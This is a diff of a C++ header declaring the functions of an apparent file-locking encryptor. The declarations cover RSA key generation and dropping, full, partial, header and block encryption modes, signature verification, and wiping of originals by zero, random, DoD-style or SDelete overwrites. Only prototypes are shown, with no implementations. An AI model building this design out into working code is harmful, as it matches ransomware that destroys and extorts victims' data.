@@ -1,89 +1,50 @@
 #ifndef _FILE_SYSTEM_H_
 #define _FILE_SYSTEM_H_
 
-#include "macro.h"
+#include "locker.h"
 #include "structures.h"
 #include "pathsystem.h"
-#include "locker.h"
 #include "global_parameters.h"
 
 namespace filesystem
 {
-	BOOL getParseFile(PFILE_INFO FileInfo);
-	BOOL CreateFileOpen(PFILE_INFO FileInfo, DWORD state_const);
-	BOOL ReadRSAFile(CRYPT_INFO* CryptInfo);
-	BOOL EncryptFileFullData(PFILE_INFO FileInfo);
-	BOOL EncryptFilePartly(PFILE_INFO FileInfo, BYTE DataPercent);
-	BOOL EncryptFileBlock(PFILE_INFO FileInfo);
-	BOOL EncryptFileHeader(PFILE_INFO FileInfo);
-	BOOL OptionEncryptMode(PFILE_INFO FileInfo, EncryptModes& mode);
-	WCHAR* MakeCopyFile(WCHAR* Path, WCHAR* Filename, WCHAR* exst, WCHAR* FPath);
-	BOOL ReadFile_(PFILE_INFO FileInfo);
-	BOOL DropRSAKey(WCHAR* Path, BYTE PublicKey[], BYTE PrivateKey[], DWORD SizeKey, DWORD p_SizeKey);
-	BOOL HandlerGenKeyPairRSA();
-	BOOL EncryptRSA(PFILE_INFO FileInfo);
-	BOOL FileCryptEncrypt(PFILE_INFO FileInfo);
-	BOOL FileCryptDecrypt(PFILE_INFO FileInfo);
-	BOOL HashSignatureFile(SLIST<locker::HLIST>* list, HANDLE HandleHash);
-	VOID sort_hash_list(SLIST<HASH_LIST>* list);
-	BOOL CreateSignatureFile(SLIST<HASH_LIST>* HashList);
-	BOOL VerificationSignatureFile(SLIST<HASH_LIST>* HashList);
-	VOID RootKeySignatureTrust(VOID);
-	BOOL OverWriteFile(PFILE_INFO FileInfo);
+	bool WriteFullData(DESC desc, void* buffer, unsigned size);
+	bool getParseFile(PFILE_INFO FileInfo);
+	bool getParseFile(TCHAR* FilePath, DESC* desc_file, unsigned* filesize);
+	bool CreateFileOpen(PFILE_INFO FileInfo);
+	bool CreateFileOpen(DESC* desc_file, TCHAR* filename);
+	bool CreateFileOpen(PFILE_INFO FileInfo);
+	bool ReadRSAFile(CRYPT_INFO* CryptInfo);
+	bool OptionEncryptModeAUTO(PFILE_INFO FileInfo);
+	bool OptionEncryptModeFULL(PFILE_INFO FileInfo);
+	bool OptionEncryptModePARTLY(PFILE_INFO FileInfo);
+	bool OptionEncryptModeHEADER(PFILE_INFO FileInfo);
+	bool OptionEncryptModeBLOCK(PFILE_INFO FileInfo);
+	bool DropRSAKey(WCHAR* Path, BYTE PublicKey[], BYTE PrivateKey[], DWORD SizeKey, DWORD p_SizeKey);
+	bool HandlerGenKeyPairRSA();
+	bool EncryptRSA(PFILE_INFO FileInfo);
+	bool FileCryptEncrypt(PFILE_INFO FileInfo);
+	bool FileCryptDecrypt(PFILE_INFO FileInfo);
+	bool HashSignatureFile(SLIST<locker::HLIST>* list, DESC HandleHash);
+	void sort_hash_list(SLIST<HASH_LIST>* list);
+	bool VerifySignatureRSA(SLIST<HASH_LIST>* HashList);
+	bool VerificationSignatureFile(SLIST<HASH_LIST>* HashList);
+	void RootKeySignatureTrust(VOID);
+
+	void sort_hash_list(SLIST<HASH_LIST>* list);
+	bool nopHashSumFile(CRYPT_INFO* CryptInfo, DESC desc_file, TCHAR* Filename);
+	bool HashSumFile(CRYPT_INFO* CryptInfo, DESC desc_file, TCHAR* Filename);
+
+	TCHAR* MakeCopyFile(TCHAR* Path, TCHAR* Filename, TCHAR* exst, TCHAR* FPath);
+	TCHAR* OptionNameStandart(TCHAR* Path, TCHAR* Filename, TCHAR* exst, TCHAR* FPath);
+	TCHAR* OptionNameHash(TCHAR* Path, TCHAR* Filename, TCHAR* exst, TCHAR* FPath);
+	TCHAR* OptionNameBase(TCHAR* Path, TCHAR* Filename, TCHAR* exst, TCHAR* FPath);
+
+	bool nopOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
+	bool ZerosOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
+	bool RandomOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
+	bool DODOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
+	bool RewriteSDelete(CRYPT_INFO* CryptInfo, TCHAR* FullPath);
 }
-
-
-BOOL LoadCrypt32();
-VOID UnLoadCrypt32();
-
-
-typedef BOOL(WINAPI* CryptBinaryToStringA_t)
-(
-	const BYTE* pbBinary,
-	DWORD cbBinary,
-	DWORD dwFlags,
-	LPSTR pszString,
-	DWORD* pcchString
-	);
-
-typedef BOOL(WINAPI* CryptStringToBinaryA_t)
-(
-	LPCSTR pszString,
-	DWORD cchString,
-	DWORD dwFlags,
-	BYTE* pbBinary,
-	DWORD* pcbBinary,
-	DWORD* pdwSkip,
-	DWORD* pdwFlags
-	);
-
-typedef BOOL(WINAPI* CryptBinaryToStringW_t)
-(
-	const BYTE* pbBinary,
-	DWORD       cbBinary,
-	DWORD       dwFlags,
-	LPWSTR      pszString,
-	DWORD* pcchString
-	);
-
-typedef BOOL(WINAPI* CryptStringToBinaryW_t)
-(
-	LPCWSTR		pszString,
-	DWORD		cchString,
-	DWORD		dwFlags,
-	BYTE* pbBinary,
-	DWORD* pcbBinary,
-	DWORD* pdwSkip,
-	DWORD* pdwFlags
-	);
-
-enum
-{
-	BINARY_CRYPT = 5,
-	BASE_CRYPT = 4,
-	BINARY_CRYPT_W = 3,
-	BASE_CRYPT_W = 2
-};
-
 
 #endif
